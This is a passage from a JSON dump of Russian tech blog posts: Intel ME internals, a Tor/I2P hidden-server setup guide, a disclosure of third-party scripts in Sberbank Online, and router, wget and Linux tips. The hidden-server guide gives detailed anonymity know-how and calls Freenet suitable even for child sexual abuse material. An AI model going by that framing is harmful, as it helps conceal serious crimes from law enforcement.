			"body": "[В прошлый раз](https://habrahabr.ru/company/dsec/blog/278549/) мы рассказали об Intel Management Engine (ME) — подсистеме, которая встроена во все современные компьютерные платформы (десктопы, лэптопы, серверы, планшеты) с чипсетами компании Intel. Эта технология многими воспринимается как аппаратная «закладка», и на то есть причины. Достаточно сказать, что Intel ME является единственной средой исполнения, которая:\n- работает даже тогда, когда компьютер выключен (но электропитание подаётся);\n- имеет доступ ко всему содержимому оперативной памяти компьютера;\n- имеет внеполосный доступ к сетевому интерфейсу.\n![](https://habrastorage.org/files/526/8dc/678/5268dc678c2c48a9adee75dfbdf395c9.jpg)\n\nОшарашенный присутствием такого компонента в компьютере, пользователь (получается, что именно «пользователь», а не «владелец») наверняка задавался вопросом: можно ли выключить Intel ME?\n\nЭта статья целиком посвящена этому вопросу.\n---\n*Введение*\n\n\nНапомним, что основным компонентом Intel ME является встроенный в чипсет микроконтроллер с кастомной архитектурой. Известна лишь базовая модель, это 32-х разрядный [ARCtangent-A4](http://me.bios.io/images/c/c6/ARC4._Programmers_reference.pdf) (ME 1.x — 5.x), [ARCtangent-A5](http://me.bios.io/images/d/dd/ARCompactISA_ProgrammersReference.pdf) (ME 6.x — 10.x), SPARC (TXE) или x86 (ME 11.x — ...).\n\nНачиная с 6-й версии, ME-контроллер встраивают во все чипсеты Intel.\n\n![](https://habrastorage.org/files/d22/777/eea/d22777eea5124effa7b419893de271b8.PNG)\n[рисунок взят [отсюда](https://software.intel.com/sites/default/files/article/393789/amt-9-start-here-guide.pdf)]\n\nЗагрузчик его прошивки хранится во внутренней ROM и недоступен для анализа. Сама прошивка располагается в регионе ME во внешней SPI флэш-памяти (т.е. в той же памяти, где хранится BIOS). Структура этой прошивки такова, что весь исполнимый код разбит на модули, которые хранятся в сжатом виде (либо кастомной реализацией алгоритма Хаффмана, либо LZMA). Эти кодовые модули криптографически защищены от модификаций.\n\nЕсли есть желание поревёрсить прошивку, рекомендуем воспользоваться [этими двумя](https://io.netgarage.org/me/) инструментами для изучения её структуры и распаковки кодовых модулей.\n\nИтак, рассматриваемая подсистема является аппаратно-программной основой для различных системных функций (некоторые раньше реализовывали в BIOS) и технологий Intel. Их имплементация включается в состав прошивки Intel ME. Одной из таких технологий, использующих несколько особых привилегий Intel ME, является Active Management Technology (AMT).\n\n\n*Контроль за состоянием AMT*\n\n\nAMT – технология удалённого администрирования компьютерных систем, для которых заявлена официальная поддержка Intel vPro (это бренд, объединяющий несколько технологий, в том числе, AMT). Речь идёт о системах с чипсетами линейки Q (например, Q57 или Q170).\n\nУчитывая высокую стоимость таких платформ, вряд ли кто-то случайно приобретёт компьютер с AMT для того, чтобы принципиально этой технологией не пользоваться. Тем не менее, если под рукой именно такой продукт, и есть необходимость убедиться, что AMT на текущий момент выключена, следует воспользоваться утилитой [ACUwizard](http://vpro.by/intel-amt-configuration-utility-acu-wizard-10):\n\n![](https://habrastorage.org/files/4e3/294/2f2/4e32942f242845a8bbfd8b61c59b17e5.PNG)\n[рисунок взят [отсюда](http://vpro.by/nastroyka-intel-amt-kvm-v-dq67sw)]\n\nили средством Intel Management and Security Status (входит в состав ПО Intel ME для vPro-платформ, можно обнаружить в трее):\n\n![](https://habrastorage.org/files/0d8/a29/e42/0d8a29e42898427b9f79092ed7c06c89.PNG)\n\n\n\n\nНаконец, чтобы защитить компьютеры в своей сети от несанкционированного управления извне, необходимо настроить внешний файрвол на фильтрацию AMT-запросов по признакам. Явным признаком AMT-запроса может являться порт, к которому происходит обращение:\n- 5900 – AMT VNC-сервер без шифрования;\n- 16992 – AMT веб-сервер по протоколу HTTP;\n- 16993 – AMT веб-сервер по протоколу HTTPS;\n- 16994 – AMT redirection для SOL, IDE-R, KVM без шифрования;\n- 16995 – AMT redirection для SOL, IDE-R, KVM с TLS.\n\n\nВ продуктах, не относящихся к разряду vPro-платформ AMT включить нельзя, однако в состав прошивки Intel ME входят сетевые драйверы:\n\n![](https://habrastorage.org/files/cdc/3ae/980/cdc3ae98071e4ff8af8f1c83a2a96601.PNG)\n\nЭто означает, что ME-контроллер (не будем забывать, что он всегда включен) имеет техническую возможность использования сетевого интерфейса.\n\nПоэтому проблему стоит решать основательно – пытаться выключить подсистему Intel ME.\n\n\n*Выключение Intel ME при помощи утилит из Intel System Tool Kit*\n\n\nВендорам материнских плат компания Intel предоставляет:\n1. Прошивку Intel ME в бинарном виде;\n2. Модули MEBx для BIOS;\n3. ПО Intel ME для ОС;\n4. Intel System Tool Kit (STK) — комплект программных средств и документации для сборки образов SPI флэш-памяти, применения этих образов и получении информации о текущем состоянии Intel ME.\n\n\nНесмотря на то, что этот комплект распространяется по NDA (судя по меткам «Intel Confidential» в прилагаемых документах), многие вендоры забывают его вырезать из архива с ПО Intel ME, который передаётся пользователям. А ещё не закрывают свои ftp-серверы от внешнего доступа. В результате, утекших версий STK очень много. [Здесь](http://www.win-raid.com/t596f39-Intel-Management-Engine-Drivers-Firmware-amp-System-Tools.html) можно слить комплект для любой версии Intel ME.\n\nВажно, чтобы major и minor version (первая и вторая цифры) используемого STK совпадала с версией Intel ME целевой системы, информацию о которой можно получить, например, воспользовавшись [ME analyzer](http://www.win-raid.com/t840f39-ME-Analyzer-Intel-Engine-Firmware-Analysis-Tool.html):\n\n![](https://habrastorage.org/files/6ad/3df/8bd/6ad3df8bd1d547669f82bc8609778c84.PNG)\n\nПроверять текущее состояние Intel ME можно при помощи утилиты MEinfo, которая через Management Engine Interface (MEI) получает информацию о работе этой подсистемы:\n\n![](https://habrastorage.org/files/25a/095/c35/25a095c35d014533977ee34647c29405.PNG)\n\nНапомним, что MEI является интерфейсом для связи основного CPU с подсистемой Intel ME и представляет собой набор регистров в конфигурационном пространстве PCI и в MMIO. Команды этого интерфейса не документированы, как и сам протокол.\n\n\n*Flash Image Tool*\n\n\nНа старых платформах (Intel ME версии 5.x и ниже) выключить данную подсистему можно, воспользовавшись Flash Image Tool (утилита из STK, предназначенная для сборки образов SPI флэш-памяти из отдельно взятых регионов BIOS, ME, GbE). При сборке задаются параметры, которые прописываются в этих регионах и в регионе Flash Descriptors. В последнем есть один очень интересный флаг, «ME disable»:\n\n![](https://habrastorage.org/files/b9a/75c/f9c/b9a75cf9c75b4ce4891952b15bb71d67.PNG)\n\nТаким образом, для выключения Intel ME на целевой компьютерной системе, в её SPI флэш-память следует записать (программатором) новый образ с выставленным флагом «ME disable».\n\nРаботает ли этот способ, нам неизвестно. Но звучит правдоподобно, учитывая, что ME-контроллер в тех версиях интегрировался только в чипсеты линейки Q, т.е. был не обязательным компонентом для всех платформ.\n\n\n*Flash Programming Tool*\n\n\nНачиная с Intel ME 9 версии, в утилиту Flash Programming Tool, предназначенную для программирования SPI флэш-памяти компьютерных платформ, была добавлена возможность временно выключать Intel ME:\n\n![](https://habrastorage.org/files/192/3b4/61a/1923b461accc4240bb1916eb228e0ac1.PNG)\n\nВыключение выполняется отправкой команды в MEI. После отработки Intel ME не подаёт «признаков жизни», не отвечает даже MEI:\n\n![](https://habrastorage.org/files/b52/1f2/c69/b521f2c69b2a47958c8460b0657c2671.PNG)\n\nСогласно документации, в таком состоянии подсистема Intel ME находится до следующего запуска компьютера или перезагрузки.\n\nНа vPro-платформах возможность отправки этой команды есть и в более ранних версиях. Для этого необходимо воспользоваться разделом конфигурирования ME/AMT в BIOS, где должна быть опция «Intel ME disable»:\n\n![](https://habrastorage.org/files/dc7/4e1/846/dc74e1846ef6460bbdcdf39bf70d9ad0.PNG)\n[рисунок взят [отсюда](https://github.com/skochinsky/papers/blob/master/2012-10%20[Breakpoint]%20Rootkit%20in%20your%20laptop.pdf)]\n\nНельзя говорить о том, что этот способ позволяет полностью отключить Intel ME, хотя бы потому, что до момента принятия команды на отключение ME-контроллер успеет загрузиться, а значит, выполнить некоторую часть кода прошивки.\nНесмотря на то, что Intel ME не подаёт «признаков жизни» после этой операции, неизвестно, может ли эту подсистему заново включить какой-нибудь сигнал извне. Также неясно, насколько Intel ME выключена.\n\n\n*Принудительное выключение Intel ME*\n\n\nВ интересах исключения возможности исполнения ME-контроллером кода прошивки, логично попробовать ограничить ему доступ к ней. А что? Нет кода – нет проблемы.\n\nПроанализировав документацию, которая прилагается к STK, и, немного подумав, мы предположили, что это можно сделать следующими способами.\n\n\n1. Вырезать (обнулить) ME регион из SPI флэш-памяти.\n\nТе, кто [пробовал так делать](https://libreboot.org/faq/) сообщают о том, что их платформа либо не загружалась без наличия подлинной прошивки ME, либо [выключалась](http://www.win-raid.com/t1379f39-Yoga-Pro-shutdowns-every-minutes.html) ровно после 30 минут работы.\n\nОтказ компьютерной системы грузиться без прошивки Intel ME можно объяснить важностью ME-контроллера в процессе инициализации аппаратной составляющей. А 30-минутный таймаут наводит на мысль о WDT (Watch Dog Timer).\n\n\n2. Включить не дескрипторный режим SPI флэш-памяти, т.е. «по старинке» когда в ней содержался только BIOS. Для этого требуется сделать одно из двух:\nстереть первые 0x20 байт в ней (таким образом повредив сигнатуру 0x0FF0A55A, которая определяет режим работы флэш-памяти);\nвыставить джампер HDA_SDO (если он есть).\n\n\nТаким образом, ME-контроллер не получит доступ к своему региону, и, следовательно, не будет исполнять прошивку.\n\nС одной стороны, ME-контроллер так же, как и в предыдущем случае, может препятствовать нормальной работе компьютерной системы. С другой стороны, не дескрипторный режим включает т.н. manufacturing mode, который используется вендорами в отладочных целях, и есть шанс, что система запустится.\n\n\n3. Известно, что прошивка Intel ME распаковывается в выделенную и скрытую от основного CPU область оперативной памяти – ME UMA. Выделение и блокировку этой области осуществляет BIOS во время конфигурирования карты памяти. Тогда почему бы не вырезать эти фрагменты кода из BIOS, чтобы данная область не выделялась. Тогда прошивка ME не будет распаковываться и исполняться.\n\nПроведённые эксперименты показали, что такой способ тоже не годится, и система не запускается. К тому же, у ME-контроллера есть внутренняя SRAM, которая используется при недоступности ME UMA. Поэтому часть прошивки всё равно будет исполняться.\n\n\n*Вывод*\n\n\nМы рассказали о предполагаемых и требующих развития способах выключения Intel ME:\n- отключение при каждом старте командой в MEI или отключение флагом в регионе flash descriptors (в зависимости от версии);\n- ограничение доступа ME-контроллеру к своей прошивке либо перевод компьютерный платформы в manufacturing mode.\n- препятствование нормальной работе ME-контроллера не обеспечивая его runtime-памятью.\n\n\nОчевидно, что некоторые предложенные решения влекут за собой неработоспособность компьютерной системы, остальные не дают никакой гарантии того, что подсистема Intel ME действительно выключена. В связи с этим, мы пришли к выводу, что полностью выключить Intel ME крайне сложно.\n\nВероятно, это связано с тем, что, отключая Intel ME, мы нейтрализуем важный компонент в архитектуре компьютерной системы. Например, без ME некому будет решать важные системные задачи вроде ACPI или ICC (которые когда-то реализовывались в BIOS). Чтобы заставить платформу стабильно работать без ME, как минимум, необходимо вернуть реализацию этих технологий в BIOS.\n\nТак или иначе, вопрос о том, как отключить Intel ME без потери работоспособности компьютерной системы, остаётся открытым.\n\n[habrahabr.ru](https://habrahabr.ru/company/dsec/blog/282546/)"
		},
		{
			"post_id": 66,
			"title": "Небольшой ликбез по технически грамотной организации скрытого сервиса в TOR и I2P.",
			"date_published": 1496861236.802,
			"body": "Предположим, вы решили поделиться какой-нибудь информацией, и желаете сделать это анонимно. Для этого существует много способов, но сделать это правильно с первого раза не просто. Сначала нужно определить технологию, которая вам подойдёт, что сильно зависит от типа вашей информации (контента). Для начала небольшой обзор технологий (неполный):\n---\n1. Контент - статичный (например видео, или тексты, в которые изменения вносятся редко). Тогда хороший выбор с точки зрения технической грамотности - freenet. Суть его проста: ваш файл будет пошифрован, разбит на кусочки и сохранён на компъютерах других учасников freenet. После чего вы можете выключить свой компъютер, контент останется достуным. Но к сожалению чтобы получить доступ пользователи должны установить у себя программу freenet (написана на java, есть под windows и linux). То есть контент должен представлять достаточную ценность и уникальность, чтобы ради этого пользователь заморочился скачать, установить и настроить freenet. И ещё разобраться как им пользоваться. Весьма надёжен, подходит даже для распространения сильно противозаконного контента (типа ДП). Есть много альтернатив, которые упрощают использование, делая его доступным менее технически грамотным пользователям, например ZeroNet, IPFS, RetroShare… (постоянно появляются новые). Но в них не всё хорошо с анонимностью (в некоторых отсутвует, в других есть но надёжность сомнительна). Обзор этого дела будет отдельно.\n2. Контент - ‘обычный сайт’, возможно с форумом, отзывами, или другими способами когда пользователи изменяют содержимое сайта. То есть самый типичный случай. В отличие от первого варианта, сервер должен быть всегда включен (и для надёжности их желательно иметь более одного). Для простоты предположим что это nginx+php+mysql, хотя не очень важно какие именно там программы, apache+ruby+postgres будет настраиваться аналогично (с точки зрения сокрытия). Для такого есть два основных решения: tor и i2p (есть и другие, но сильно менее распространённые). Их и рассмотрим в первую очередь.\nИтак, предположим что у вас уже есть сайт, в котором имеется (не обязательно всё сразу):\n\n1. Статика (картинки, css…), которую отдаёт nginx\n2. Динамические страницы (например форум), на php\n3. Для php нужна mysql база\n\nИ вы желаете чтобы пользователи могли поcещать ваш сайт как и обычно в интернете, но никто не должен узнать физическое местонахождение сервера. Для начала, нужно решить где собственно будет размещён ваш сервер:\n\n1. У вас дома. Как ни странно, это хороший вариант, но при условии что вы точно всё правильно настроете и совсем нигде не накосячите. Главное уникальное достоинство метода - вы полностью контролируете физический доступ к серверу, что в других вариантах невозможно и создаёт немало проблем.\n2. Выделенный сервер. Тоже неплохой вариант, при условии что вам дают именно физический сервер, с доступом к iKVM (это когда можно по удалёнке зайти в BIOS). Лучше чем (1) тем, что в случае если сервер найдут, вы просто сделаете новый (в варианте (1) вас посадят). Но проблема в том, что у посторонних имеется доступ к железу, и как следствие техническая возможнось получить например закрытые ключи. (Да, можно настроить шифрование всего диска, использовать датчик вскрытия корпуса,… но это лишь затруднит получение дампа диска, но не исключит полностью.) Кроме того это дорого (по сравнению с другими вариантами).\n3. Виртуальный сервер. Админ хоста имеет полный доступ к RAM вашего сервера. Однако можно использовать в некоторых случаях. Сильно дешевле чем (2).\n\nТут будут пропущены некоторые вопросы (например выбор железа), начнём с почти начала:\n\n1. Установить основную ОС (обычно это ubuntu server, но параноики могут порекомендовать например FreeBSD). При установке в любом случае следует зашифровать корневую ФС и своп. Это значит, что сервер просто не загрузится без пароля, и дамп диска бесполезен.\n2. Снести из основной ОС всё лишнее, на время настройки оставить ssh, потом снести и его. Рекомендуется также вообще не иметь ни одного IP адреса на хосте. Всё что нужно - это возможность поднятия виртуальных машин (их понадобится несколько). Дальше предполагается что виртуалки - KVM, хотя при желании можно использовать XEN или VirtualBox. Принцип прост: каждой программе отдельная виртуалка, чтобы проблемы с любой из них не перекинулись на всю систему в целом.\n3. В первой виртуалке будет запущен роутер (OpenWRT или pfSense). У неё будет три виртуальных сетевых интерфейса, первый к интернету от провайдера, второй к виртуалкам с ТОR и I2P, третий к виртуалке с nginx. Роутер позаботится, чтобы ни один пакет из других виртуалок никак не мог пройти мимо TOR или I2P. Это нужно, на случай если злоумышленник получит доступ к одной из виртуалок, и попробует узнать реальный IP (от провайдера).\n4. Во второй - tor, будет предоставлять наш сайт в .onion\n5. В третьей - i2p, тоже в i2p.\n6. В четвёртой - nginx. В ней же можно запустить PHP и MySQL, это простой вариант но имеет недостаток: в случае если в любой из этих программ (например PHP скриптах, что вероятнее всего), злоумышленник получит доступ ко всем остальным. Лучше сделать как на рисунке: PHP и MySQL разнести по разным виртуалкам, это потребует больше ресурсов (RAM) и создаст проблемы с настройкой (большинство движков и фрэймворков на PHP предполагают что PHP и nginx на одном хосте). Зато если кто-то сломает любой из этих компонентов, то останется в пределах своей виртуалки и не сможет попортить остальные.\n7. Настроить роутер. Сперва всё запретить, затем разрешить из LAN1 (см. рисунок) доступ в интернет и в LAN2. Временно разрешиь из LAN2 в интернет (для установки пакетов nginx,php, mysql) после чего обратно запретить. таким образом, если кто-то получит доступ (пусть даже root) на любой виртуалке из LAN2, то не сможет отправить ничего не только в инет, но даже к web-интерфейсу i2p. (Хороший вопрос: как вы сами будете получать доступ к нему ? Ответ будет дальше…).\n8. Настроить TOR. В torrc прописать HiddenService локальный IP (из LAN2) nginx, порт 80 (https в .onion не нужен, т.к. сам факт TCP соединения с .onion доказывает что сервер имеет приватный ключ (обычно лежит в /var/lib/tor/hidden_service/). Это вполне удобно делать из консоли, т.к. достаточно отредактировать один текстовый файл (torrc).\n9. Настроить I2P. Делать это из консоли правкой конфигов - неудобно, поэтому сперва надо разрешить доступ к web-интерфейсу, (в /var/lib/i2p/i2p-config/clients.config найти строку clientApp.0.args=7657 127.0.0.1 ./webapps/ и заменить 127.0.0.1 на 0.0.0.0). Теперь есть множество способов зайти туда браузером: сделать ssh туннель, временно соединить LAN2 с физическим ethernet, пробросить порт (port forward) на роутере, …) один из самых простых и надёжных - сделать ещё один hidden service (.onion адрес) в tor, который будет показывать web-интерфейс i2p. Затем уже несложно добавить i2p туннель к вашему сайту.\nСейчас наш сайт будет доступен по .onion и .i2p адресу. Однако, часто хочется странного - чтобы пользователи заходили на сайт по обычному DNS имени, но сайт при этом был скрытым. Так тоже можно, и для этого понадобится самый дешёвый виртуальный сервер. На нём нужно установить nginx и tor.\n\n1. В torrc прописать:\n```\nVirtualAddrNetworkIPv4 10.202.0.0/16\nAutomapHostsOnResolve 1\nTransPort 9040\nTransListenAddress 0.0.0.0\nDNSPort 53\nDNSListenAddress 0.0.0.0\n```\n2. прописать правило фаервола (не забудте поставить iptables-persistent, чтобы оно пережило перезагрузку:\n```\niptables -t nat -A OUTPUT -m tcp -p tcp -d 10.202.0.0/16 -j REDIRECT --to-ports 9040\n```\n3. В /etc/resolv.conf\n```\nnameserver 127.0.0.1\n```\n4. В /etc/nginx/sites-available/default\n```\nlocation / {\n    proxy_pass http://zqktlwi4fecvo6ri.onion;\n    proxy_set_header Host zqktlwi4fecvo6ri.onion;\n}\n```\n(это адрес thehiddenwiki, замените на свой).\n\nТеперь ваш сервер доступен по обычному IP вашего хостнига (ясен пень что все процедуры, начиная от регистрации почты для покупки VPS и настройка его надо делать через TOR). И если что - то в худшем случае сервер выключат, и ничто не помешает завести новый.\n\nВ этой схеме есть серьёзный недостаток: в случае зеродея в самом tor деанонимизация неизбежна. Как это исправить - в следующей части.\n\n[источник](https://diasp.ca/posts/335557)"
		},
		{
			"post_id": 65,
			"title": "Можно ли определить террориста по его цифровому следу | Артур Хачуян | Лекториум",
			"date_published": 1496776728.236,
			"body": "<iframe width=\"854\" height=\"480\" src=\"https://www.youtube.com/embed/vNmANAFB0EQ?list=WL\" frameborder=\"0\" allowfullscreen></iframe>"
		},
		{
			"post_id": 64,
			"title": "Визуализация join в SQL",
			"date_published": 1496403442.924,
			"body": "ресурс тут: http://sql-joins.leopard.in.ua/\n\nну и картинка в придачу: \n![](./img/sql-joins.jpg)"
		},
		{
			"post_id": 63,
			"title": "Как Сбербанк Онлайн сливает данные пользователей",
			"date_published": 1496218560.057,
			"body": "В связи с тем, что мне не удалось связаться со Сбербанком, точнее — с кем-то вменяемым с той стороны, хочу поделиться, чтобы если не исправить утечку данных, то хотя бы предупредить о ней.\n\n![](https://storage.olegon.ru/supermag/upload/2017/Tooltip_122.png)\n---\nСовсем недавно случайно обнаружил, что Сбербанк Онлайн густо утыкан счетчиками. Это Google, Doubleclick, Rutarget, ЯМетрика. Еще раз подчеркну, в личном кабинете, где люди переводят деньги, вводят очень персональную информацию и т.п., в этом личном кабинете натыканы скрипты, которые Сбербанку совсем не принадлежат, а принадлежат совсем не нашим компаниям, например. Давайте посмотрим, что из этого выходит (слайды и видео ниже).\n\nОбнаружил я эту гадость совершенно случайно, поскольку баннерорезаками не пользуюсь и брезгую в силу создаваемых ими глюков. Теперь же я настоятельно рекомендую до исправления ситуации резак включать хотя бы на сайте Сберонлайна, хотя и с ним при включенном резаке были глюки, лично у меня.\n\nБаннерорезка блокирует часть зловредов.\n\n![](https://storage.olegon.ru/supermag/upload/2017/Selection_123.png)\n\nЯ написал на zabota@ Сберу и в FB. Звонить я не терплю, уж извините. В FB был получен замечательный ответ.\n\n![](https://storage.olegon.ru/supermag/upload/2017/Selection_124.png)\n\nЯ даже не обиделся, просто записал видео.\n\n<iframe width=\"780\" height=\"439\" src=\"https://www.youtube.com/embed/iz016HFBEG8\" frameborder=\"0\" allowfullscreen></iframe>\n\n\nСлева сайт Сбербанк Онлайн, справа — мой комп в 20км от того места, где я сижу. При наборе какого-либо текста, включая пароль, данные уходят в журнал на моем компьютере. Заморачиваться не хотелось, потому на все ушло меньше времени, чем я пишу эту статью.\n\nСуть происходящего в следующем:\n\n1) Скрипты могут быть использованы для сбора любой информации, о платежах, картах, паролях и других вводимых и отображаемых данных.\n2) Скрипты могут не принадлежать тем хостам, с которых их изначально планировалось брать (в видео выше я подменил один из скриптов на свой), поскольку оценка безопасности перекладывается на браузер пользователя, изначально крайне небезопасную вещь.\n3) Скрипты могут быть использованы для подмены вводимой информации.\n\nНа видео я демонстрировал только дублирование ввода пароля. Просто потому, что не хочу входить в свою учетку публично.\n\nНачалось все с моего [форума](https://olegon.ru/showthread.php?t=27025), но, к сожалению, никакого результата это не дало.\n\nвзято [отсюда](https://geektimes.ru/post/289577/)"
		},
		{
			"post_id": 62,
			"title": "Как настроить OpenVPN на MikroTik?",
			"date_published": 1495448197.18,
			"body": "Клиент\nНастройка сервера для MikroTik\n---\nФайл конфигурации на OpenVPN сервере:\n```\ncat <<EOF > /etc/openvpn/server.conf\ncd /etc/openvpn\nmode server\ntls-server\nport 1194\nproto tcp\ndev tun\nlog /var/log/openvpn.log\nstatus /var/log/openvpn-status.log\nca ca.crt\ncert server.crt\nkey server.key\ndh dh2048.pem\nifconfig-pool-persist ipp.txt\n\nserver 10.8.0.0 255.255.255.0\nclient-to-client\n\npush \"route 10.8.0.1 255.255.255.255\"\npush \"route 10.8.0.0 255.255.255.0\"\npush \"redirect-gateway def1\"\n\npush \"dhcp-option DNS 77.88.8.8\"\npush \"dhcp-option DNS 8.8.8.8\"\nuser nobody\ngroup nobody\nkeepalive 10 120\npersist-key\npersist-tun\ncipher AES-256-CBC\nverb 3\nEOF\n```\nПерезапускаем сервер\nГенерируем клиентский сертификат. После генерации скачиваем с сервера файлы ca.crt, client1.crt и client1.key на компьютер, с которого будем настраивать MikroTik.\nВходим на MikroTik и переходим в меню Files, далее поочередно загружаем файлы ca.crt, client1.crt и client1.key через поле Upload, нажимая на Choose File.\n\nИмпорт сертификатов\nПосле загрузки файлов переходим к установке сертификатов в меню System подменю Certificates.\n![](http://specialistoff.net/file/8a511d4c3db6784a66b08be78d0f7112.png)\n\nИмпортируем два сертификата ca.crt и client1.crt, нажав на кнопку Import и выбрав соответствующий файл.\n![](http://specialistoff.net/file/ced2bba2e768a5a5d35ea364c2bd3a8d.png)\n\nДалее переходим в сертификат client1.сrt и импортируем ключ сертификата client1.key кнопкой Import.\n![](http://specialistoff.net/file/f5eb1d967a3d8d77582050cf2b15b9aa.png)\n\nСоздание подключения\nПереходим в меню Interfaces\n![](http://specialistoff.net/file/59b54d0223d4452f0e072cf8174ef8f3.png)\n\nИ добавляем новое подключение OVPN Client\n![](http://specialistoff.net/file/e2c632e0b09042bf9dcd08fa176a07b2.png)\n\nЗаполняем поля:\nConnect To — IP адрес Вашего VPS;\nUser — client1;\nCertificate — client1.crt;\nAuth — sha1;\nCipher — aes 256;\nAdd Default Route — ставим галочку по необходимости.\nНажимаем кнопку OK\n\n[ссылка](http://specialistoff.net/question/464)\n"
		},
		{
			"post_id": 61,
			"title": "Скачиваем сайты целиком - утилита wget (на память)",
			"date_published": 1495305715.741,
			"body": "Скачиваем сайты целиком - утилита wget\n\nwget — это утилита, которая предназначена для загрузки файлов по сети (из интернета). Я расскажу, как использовать wget, чтобы скачивать сайты из интернета целиком и затем просматривать их в автономном режиме.\n---\nС помощью wget можно скачивать сайты, включая картинки, всего лишь указав адрес сайта и определенные параметры. wget будет автоматически переходить по ссылкам на сайте и скачивать страницу за страницей. Рассмотрим несколько примеров от простых к более сложным использования wget для скачивания сайтов.\n\nЧтобы скачать сайт целиком с помощью wget нужно выполнить команду:\n``` wget -r -k -l 7 -p -E -nc http://site.com/ ```\nПосле выполнения данной команды в директорию site.com будет загружена локальная копия сайта http://site.com. Чтобы открыть главную страницу сайта нужно открыть файл index.html.\n\nРассмотрим используемые параметры:\n-r\t—\tуказывает на то, что нужно рекурсивно переходить по ссылкам на сайте, чтобы скачивать страницы.\n-k\t—\tиспользуется для того, чтобы wget преобразовал все ссылки в скаченных файлах таким образом, чтобы по ним можно было переходить на локальном компьютере (в автономном режиме).\n-p\t—\tуказывает на то, что нужно загрузить все файлы, которые требуются для отображения страниц (изображения, css и т.д.).\n-l\t—\tопределяет максимальную глубину вложенности страниц, которые wget должен скачать (по умолчанию значение равно 5, в примере мы установили 7). В большинстве случаев сайты имеют страницы с большой степенью вложенности и wget может просто «закопаться», скачивая новые страницы. Чтобы этого не произошло можно использовать параметр -l.\n-E\t—\tдобавлять к загруженным файлам расширение .html.\n-nc\t—\tпри использовании данного параметра существующие файлы не будут перезаписаны. Это удобно, когда нужно продолжить загрузку сайта, прерванную в предыдущий раз.\n\nМы рассмотрели лишь одно из возможных применений утилиты wget. На самом деле область применения wget значительно шире и wget обладает большим числом дополнительных параметров. За более подробной информацией обращайтесь к руководству, выполнив в командной строке: man wget.\n\nвзято [отсюда](http://pingvinus.ru/note/wget-download-sites)"
		},
		{
			"post_id": 60,
			"title": "Firefox на Android. Тонкая настройка",
			"date_published": 1495013493.787,
			"body": "Нашел такие рекомендации: \n>1. Перенос кэша браузера на внешнюю карту. \nУстройство рутовано, приложениям можно писать на карту памяти.\nСоздаем папку на карточке SD, например FFCache.\nВ FF заходим на ``` about:config ```, создаем строковый параметр:\n``` browser.cache.disk.parent_directory ```\nприсваевыем ему значение:\n``` /Storage/ExtSdCard/FFCache ```\nПерегружаем лису\n``` browser.cache.disk.capacity = размер кБ ```\n``` browser.cache.disk.smart_size.enabled = false ```, чтобы использовать вышеуказанный размер\n2. Оптимизируем работу с кэшэм. \nДополение Load from Cache. Power режим - постоянно использовать кэш для всех элементов.\n>\n\n[источник](http://electronick.livejournal.com/56422.html)"
		},
		{
			"post_id": 59,
			"title": "Рутуем ASUS Zenfone C (ZC451CG (Z007))(заготовка)\n",
			"date_published": 1494787693.074,
			"body": "Необходимые инструменты и материалы: \n1. файлы исправленной прошивки, \nна основе вот этой: http://bit.ly/1SPOntc\n2. Android SDK\n\nДалее выполняем следующие действия: \n1. Скачиваем и устанавливаем Android SDK\n```\nwget https://dl.google.com/android/repository/sdk-tools-linux-3859397.zip\nunzip sdk-tools-linux-3859397.zip -d $HOME/Android/sdk\n```\n2. Скачиваем и распаковываем прошивку\n```\nunzip "
		},
		{
			"post_id": 58,
			"title": "Решение проблем с монтированием разделов NTFS",
			"date_published": 1494786662.031,
			"body": "Существует проблема монтирования разделов NTFS в Linux после Windows 8(8.1, 10). \n\n>Windows is hibernated, refused to mount.\n>Failed to mount '/dev/sda2': Операция не позволена\n>The NTFS partition is in an unsafe state. Please resume and shutdown\n>Windows fully (no hibernation or fast restarting), or mount the volume\n>read-only with the 'ro' mount option.\n\nНесколько решений: \n>Первый, отключить в винде гибернацию. Что-то типа ```powercfg.exe /hibernate off ``` с правами администратора. Должна отключить функцию гибернации и проблемы с монтированием должны закончится.\n> Второй, попробовать смонтировать с параметром remove_hiberfile который должен удалить файл гибернации и позволить смонтировать диск.\n```mount -t ntfs-3g -o remove_hiberfile /dev/sda2 /mnt```\n\nвзято отсюда: https://kubuntu.ru/node/13675\n\n"
		},
		{
			"post_id": 57,
			"title": "Вконтакте совершил очередной прорыв. На короткое время все пользователи соцсети получили права модераторов",
			"date_published": 1490176822.706,
			"body": "Вконтакте в очередной раз решил порадовать всех своих пользователей, приоткрыв завесу секретности: каждый из пользователей получил возможность увидеть вк глазами админов. Баг пофиксили в течение достаточно быстрого времени, но у многих остались вопросы. Особенно по поводу возможности посмотреть скрытые фото пользователей.\n\nКакой-то хороший человек успел записать видео с возможностями, которые есть у модераторов (система не давала читать сообщения или просматривать скрытые фото из-за ошибки доступа, но у реальных модераторов такой доступ, судя по всему есть).\n<iframe width=\"780\" height=\"439\" src=\"https://www.youtube.com/embed/Ne2wV-CLgxU\" frameborder=\"0\" allowfullscreen></iframe>\nПодробнее под катом\n---\n\nНе уверен связана ли обновленная авка на странице Павла Дурова с этими событиями, скорее всего Паша решил протроллить своих приемликов, которые как всегда налажали:\n\n![](https://habrastorage.org/getpro/habr/post_images/56c/587/2d3/56c5872d38c0c1b8ca0634084f81a115.png)\n\nПримерно в это же время появилась запись от официального сообщества Команды Вконтакте:\n\n![](https://habrastorage.org/getpro/habr/post_images/d95/ae7/c34/d95ae7c34eb646bb570a2895ac92d3ac.png)\n\nИз того, что известно наверняка:\n\nРасширенный доступ к профилю пользователя:\n\n![](https://habrastorage.org/getpro/habr/post_images/8e1/415/f94/8e1415f9462a68c4041abc2ace02b0a7.png)\n\nВозможности наказания непослушных сообществ:\n\n![](https://habrastorage.org/getpro/habr/post_images/c3d/dfe/771/c3ddfe771045294f3ab3944b44bc6c68.jpg)\n\nБан по шаблону:\n\n![](https://habrastorage.org/getpro/habr/post_images/e3e/7d6/a22/e3e7d6a22d61be8279175f874744708e.jpg)\n\nДоступ к багрепортам:\n\n![](https://habrastorage.org/getpro/habr/post_images/3d9/0ef/0f2/3d90ef0f21e36813555e7e7bd4bc6048.jpg)\n\nНекоторые пользователи утверждают, что существует возможность посмотреть историю запросов каждого пользователя (достоверность скрина не подтверждена):\n\n![](https://habrastorage.org/getpro/habr/post_images/ba0/1b4/4b3/ba01b44b3e701d9ed1de745951d15549.jpg)\n\nТакже видел скрины, показывающие механизм распознования порнокартинок на аватарках, но не успел сохранить, а администрация сообщества почему-то его удалила. Настоящий он или нет — подтвердить не 